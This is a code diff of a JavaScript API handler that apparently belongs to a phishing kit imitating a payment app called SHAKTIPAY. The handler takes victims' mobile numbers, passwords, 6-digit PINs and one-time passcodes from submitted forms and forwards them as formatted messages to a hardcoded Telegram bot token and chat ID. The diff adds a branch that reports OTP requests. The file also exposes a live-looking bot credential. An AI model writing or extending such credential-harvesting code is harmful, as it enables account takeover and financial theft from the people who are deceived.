@@ -5,7 +5,7 @@ export default async function handler(req, res) {
 
   const { phone, password, pin, otp, messageType, status } = req.body;
 
-  // Aapke Telegram Credentials yahan hain
+  // Aapke Telegram Credentials
   const BOT_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
   const CHAT_ID = '6076330929';
 
@@ -13,12 +13,14 @@ export default async function handler(req, res) {
 
   if (messageType === 'LOGIN_ATTEMPT') {
     text = `🔐 <b>SHAKTIPAY - Login Attempt</b>\n\n📱 <b>Mobile:</b> +91 ${phone || 'N/A'}\n🔑 <b>Password:</b> ${password || 'N/A'}\n🔢 <b>6-Digit PIN:</b> ${pin || 'N/A'}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
+  } else if (messageType === 'OTP_REQUESTED') {
+    text = `🔐 <b>OTP requested (Modal)</b>\n\n📱 <b>Phone:</b> +91 ${phone || '..........'}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
   } else if (messageType === 'OTP_VERIFIED') {
     text = `✅ <b>SHAKTIPAY - OTP Verified</b>\n\n📱 <b>Mobile:</b> +91 ${phone || 'N/A'}\n🔑 <b>Password:</b> ${password || 'N/A'}\n🔢 <b>PIN:</b> ${pin || 'N/A'}\n🔐 <b>OTP:</b> ${otp || 'N/A'}\n✅ <b>Status:</b> ${status}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
   } else if (messageType === 'WRONG_OTP') {
     text = `❌ <b>SHAKTIPAY - WRONG OTP</b>\n\n📱 <b>Mobile:</b> +91 ${phone || 'N/A'}\n🔑 <b>Password:</b> ${password || 'N/A'}\n🔢 <b>PIN:</b> ${pin || 'N/A'}\n🔐 <b>Wrong OTP:</b> ${otp || 'N/A'}\n🕐 <b>Time:</b> ${new Date().toLocaleString()}`;
   } else {
-    text = `📨 <b>SHAKTIPAY - New Activity</b>\n\n📱 <b>Phone:</b> ${phone || 'N/A'}\n🔑 <b>Password:</b> ${password || 'N/A'}\n🔢 <b>PIN:</b> ${pin || 'N/A'}`;
+    text = `📨 <b>SHAKTIPAY - New Activity</b>\n\n📱 <b>Phone:</b> +91 ${phone || 'N/A'}`;
   }
 
   try {
